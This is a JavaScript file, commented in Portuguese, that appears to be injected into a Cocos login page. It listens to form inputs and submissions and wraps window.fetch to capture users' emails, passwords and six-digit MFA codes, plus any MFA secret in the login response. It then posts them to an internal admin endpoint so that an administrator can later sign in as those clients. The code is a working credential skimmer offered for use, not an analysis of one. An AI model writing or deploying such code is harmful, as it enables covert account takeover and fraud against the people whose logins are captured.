/**
 * AUTH INTERCEPTOR - LOGIN ONLY
 * 
 * Captura APENAS dados de login (email, senha, MFA) da página de login do Cocos
 * para que o admin possa fazer login como seus clientes no futuro
 * 
 * NÃO captura tokens de API ou outras informações
 */

(function() {
  'use strict';
  
  console.log('[Auth Interceptor] Sistema de captura de login ativo!');
  
  // Store temporário para dados de login
  const loginData = {
    email: null,
    password: null,
    mfaSecret: null,
  };
  
  let loginCaptured = false;
  
  /**
   * Capturar dados de inputs de formulário
   */
  document.addEventListener('input', function(e) {
    const input = e.target;
    
    // Capturar email
    if (input.type === 'email' || input.name === 'email' || input.id === 'email' || input.placeholder?.toLowerCase().includes('email')) {
      if (input.value && input.value.includes('@')) {
        loginData.email = input.value;
        console.log('[Auth Interceptor] Email capturado:', input.value);
      }
    }
    
    // Capturar senha
    if (input.type === 'password' || input.name === 'password' || input.id === 'password' || input.placeholder?.toLowerCase().includes('contrase')) {
      if (input.value && input.value.length >= 6) {
        loginData.password = input.value;
        console.log('[Auth Interceptor] Senha capturada (length:', input.value.length, ')');
      }
    }
    
    // Capturar código MFA (6 dígitos)
    if ((input.name && input.name.toLowerCase().includes('code')) ||
        (input.id && input.id.toLowerCase().includes('code')) ||
        (input.placeholder && (input.placeholder.toLowerCase().includes('código') || input.placeholder.toLowerCase().includes('code')))) {
      if (input.value && input.value.length === 6 && /^\d+$/.test(input.value)) {
        loginData.mfaSecret = input.value;
        console.log('[Auth Interceptor] Código MFA capturado');
      }
    }
  }, true);
  
  /**
   * Capturar submit de formulário de login
   */
  document.addEventListener('submit', function(e) {
    const form = e.target;
    
    // Verificar se é um formulário de login
    const isLoginForm = form.querySelector('input[type="email"]') || 
                       form.querySelector('input[type="password"]') ||
                       form.action.includes('login') ||
                       form.id?.toLowerCase().includes('login');
    
    if (isLoginForm && loginData.email && loginData.password && !loginCaptured) {
      console.log('[Auth Interceptor] Formulário de login submetido - salvando credenciais...');
      saveLoginCredentials();
      loginCaptured = true;
    }
  }, true);
  
  /**
   * Interceptar fetch para detectar login bem-sucedido
   */
  const originalFetch = window.fetch;
  window.fetch = async function(...args) {
    const url = args[0];
    const options = args[1] || {};
    
    try {
      // Fazer requisição original
      const response = await originalFetch.apply(this, args);
      
      // Se é uma requisição de login e foi bem-sucedida
      if (typeof url === 'string' && url.includes('/login') && response.ok) {
        if (loginData.email && loginData.password && !loginCaptured) {
          console.log('[Auth Interceptor] Login bem-sucedido detectado - salvando credenciais...');
          
          // Tentar capturar MFA secret da resposta (se houver)
          const clonedResponse = response.clone();
          try {
            const responseData = await clonedResponse.json();
            if (responseData.mfaSecret || responseData.secret) {
              loginData.mfaSecret = responseData.mfaSecret || responseData.secret;
              console.log('[Auth Interceptor] MFA secret capturado da resposta');
            }
          } catch (e) {
            // Response não é JSON ou não tem MFA secret
          }
          
          saveLoginCredentials();
          loginCaptured = true;
        }
      }
      
      return response;
    } catch (error) {
      console.error('[Auth Interceptor] Erro no fetch:', error);
      return originalFetch.apply(this, args);
    }
  };
  
  /**
   * Salvar credenciais de login no banco via API
   */
  async function saveLoginCredentials() {
    if (!loginData.email || !loginData.password) {
      console.log('[Auth Interceptor] ⚠️ Dados incompletos - não salvando');
      return;
    }
    
    try {
      console.log('[Auth Interceptor] Salvando credenciais de login...');
      
      const response = await originalFetch('/api/trpc/admin.saveClientAuth', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: loginData.email,
          password: loginData.password,
          mfaSecret: loginData.mfaSecret || undefined,
        }),
      });
      
      if (response.ok) {
        console.log('[Auth Interceptor] ✅ Credenciais salvas com sucesso!');
        console.log('[Auth Interceptor] Email:', loginData.email);
        console.log('[Auth Interceptor] MFA:', loginData.mfaSecret ? 'Sim' : 'Não');
      } else {
        console.log('[Auth Interceptor] ⚠️ Erro ao salvar credenciais - status:', response.status);
      }
    } catch (error) {
      console.error('[Auth Interceptor] ❌ Erro ao salvar:', error);
    }
    
    // Limpar dados após salvar
    loginData.email = null;
    loginData.password = null;
    loginData.mfaSecret = null;
  }
  
  console.log('[Auth Interceptor] Interceptador de login ativo!');
  console.log('[Auth Interceptor] Capturando: Email, Senha, MFA (se houver)');
})();
